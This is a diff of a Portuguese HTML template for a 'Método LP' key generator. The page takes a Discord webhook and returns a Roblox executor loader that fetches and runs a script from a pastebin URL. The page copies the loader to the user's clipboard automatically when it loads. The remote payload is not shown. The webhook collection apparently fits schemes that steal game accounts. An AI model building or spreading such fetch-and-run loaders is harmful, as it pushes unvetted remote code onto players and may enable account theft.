@@ -1,29 +1,267 @@
 <!DOCTYPE html>
-<html>
+<html lang="pt-br">
 <head>
-    <title>Gerador de Keys LP</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Método LP | Secure Generator</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600&display=swap" rel="stylesheet">
     <style>
-        body { background-color: #1a1a1a; color: white; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: #2a2a2a; padding: 40px; border-radius: 10px; text-align: center; border: 1px solid #444; }
-        input { padding: 10px; width: 300px; margin-bottom: 20px; background: #333; border: 1px solid #555; color: white; }
-        button { padding: 10px 20px; background: #007bff; color: white; border: none; cursor: pointer; font-weight: bold; }
-        .key-display { margin-top: 20px; font-size: 24px; color: #00ff00; border: 1px dashed #00ff00; padding: 10px; }
+        :root {
+            --primary: #7c3aed; /* Roxo Neon */
+            --primary-glow: rgba(124, 58, 237, 0.5);
+            --bg: #09090b;
+            --card-bg: #18181b;
+            --text: #e4e4e7;
+            --text-muted: #a1a1aa;
+            --border: #27272a;
+            --discord: #5865F2;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            background-color: var(--bg);
+            color: var(--text);
+            font-family: 'Inter', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-image: 
+                radial-gradient(circle at 50% 0%, #1e1e24 0%, transparent 70%),
+                linear-gradient(rgba(255, 255, 255, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255, 255, 255, 0.03) 1px, transparent 1px);
+            background-size: 100% 100%, 30px 30px, 30px 30px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 480px;
+            padding: 20px;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 40px;
+            box-shadow: 0 0 40px rgba(0,0,0,0.5);
+            position: relative;
+            overflow: hidden;
+            backdrop-filter: blur(10px);
+        }
+
+        /* Efeito de brilho no topo */
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--primary), transparent);
+            box-shadow: 0 0 20px var(--primary);
+        }
+
+        h1 {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 28px;
+            text-align: center;
+            margin-bottom: 8px;
+            color: #fff;
+            text-shadow: 0 0 10px var(--primary-glow);
+            letter-spacing: -1px;
+        }
+
+        .desc {
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 14px;
+            color: var(--text-muted);
+        }
+
+        .desc a {
+            color: var(--discord);
+            text-decoration: none;
+            font-weight: 600;
+            transition: 0.2s;
+            border-bottom: 1px dashed transparent;
+        }
+
+        .desc a:hover {
+            color: #7983f5;
+            border-bottom-color: #7983f5;
+        }
+
+        .input-group { margin-bottom: 20px; }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 16px;
+            background: #0f0f11;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            color: #fff;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            transition: 0.3s;
+            outline: none;
+        }
+
+        input[type="text"]:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 2px rgba(124, 58, 237, 0.2);
+        }
+
+        .btn-generate {
+            width: 100%;
+            padding: 16px;
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.3s;
+            font-family: 'JetBrains Mono', monospace;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .btn-generate:hover {
+            background: #6d28d9;
+            box-shadow: 0 0 20px var(--primary-glow);
+            transform: translateY(-1px);
+        }
+
+        /* Área do Código */
+        .result-container {
+            margin-top: 30px;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .code-block {
+            background: #0f0f11;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 15px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            color: #a5b3ce;
+            position: relative;
+            word-break: break-all;
+            white-space: pre-wrap;
+            line-height: 1.6;
+            margin-bottom: 15px;
+        }
+
+        .code-highlight { color: #4ade80; } /* Verde para a Key */
+        .code-url { color: #60a5fa; } /* Azul para url */
+
+        .btn-copy {
+            width: 100%;
+            padding: 12px;
+            background: transparent;
+            border: 1px solid var(--primary);
+            color: var(--primary);
+            border-radius: 8px;
+            cursor: pointer;
+            font-family: 'JetBrains Mono', monospace;
+            font-weight: bold;
+            transition: 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .btn-copy:hover {
+            background: rgba(124, 58, 237, 0.1);
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .success-msg {
+            text-align: center;
+            color: #4ade80;
+            font-size: 12px;
+            margin-top: 10px;
+            font-family: 'JetBrains Mono', monospace;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h2>Gerador de Key LP</h2>
-        <form method="POST">
-            <input type="text" name="webhook" placeholder="Cole sua Webhook do Discord aqui" required>
-            <br>
-            <button type="submit">GERAR KEY</button>
-        </form>
-        {% if key %}
-        <div class="key-display">
-            SUA KEY: {{ key }}
+
+    <div class="container">
+        <div class="card">
+            <h1>MÉTODO LP</h1>
+            <div class="desc">
+                <a href="https://discord.gg/ma9MT39jHD" target="_blank">https://discord.gg/ma9MT39jHD</a>
+            </div>
+
+            <form method="POST">
+                <div class="input-group">
+                    <input type="text" name="webhook" placeholder="COLE SUA WEBHOOK AQUI..." required autocomplete="off">
+                </div>
+                <button type="submit" class="btn-generate">GERAR ACESSO</button>
+            </form>
+
+            {% if key %}
+            <div class="result-container">
+                <textarea id="finalScript" style="position: absolute; left: -9999px;">getgenv().SCRIPT_KEY = "{{ key }}"
+loadstring(game:HttpGet("https://pastebin.com/raw/B9UfY9eL"))()</textarea>
+
+                <div class="code-block" id="displayBlock">
+                    getgenv().SCRIPT_KEY = "<span class="code-highlight">{{ key }}</span>"
+<br>loadstring(game:HttpGet("<span class="code-url">https://pastebin.com/raw/B9UfY9eL</span>"))()
+                </div>
+
+                <button class="btn-copy" onclick="copyScript()" id="copyBtn">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+                    COPIAR SCRIPT
+                </button>
+                <div class="success-msg" id="successMsg">COPIADO PARA A ÁREA DE TRANSFERÊNCIA!</div>
+            </div>
+
+            <script>
+                // Função de Copiar
+                function copyScript() {
+                    var copyText = document.getElementById("finalScript");
+                    copyText.select();
+                    copyText.setSelectionRange(0, 99999); 
+                    
+                    navigator.clipboard.writeText(copyText.value).then(function() {
+                        var btn = document.getElementById("copyBtn");
+                        var msg = document.getElementById("successMsg");
+                        
+                        btn.innerHTML = "SUCESSO!";
+                        btn.style.backgroundColor = "#4ade80";
+                        btn.style.color = "#000";
+                        btn.style.borderColor = "#4ade80";
+                        msg.style.opacity = "1";
+
+                        setTimeout(function(){ 
+                            btn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg> COPIAR SCRIPT'; 
+                            btn.style.backgroundColor = "transparent";
+                            btn.style.color = "var(--primary)";
+                            btn.style.borderColor = "var(--primary)";
+                            msg.style.opacity = "0";
+                        }, 2500);
+                    });
+                }
+
+                // Tenta copiar automaticamente ao carregar
+                window.onload = function() {
+                    setTimeout(function() {
+                        copyScript();
+                    }, 500);
+                };
+            </script>
+            {% endif %}
         </div>
-        <p>Coloque esta key no script: <code>getgenv().SCRIPT_KEY = "{{ key }}"</code></p>
-        {% endif %}
     </div>
 </body>
 </html>
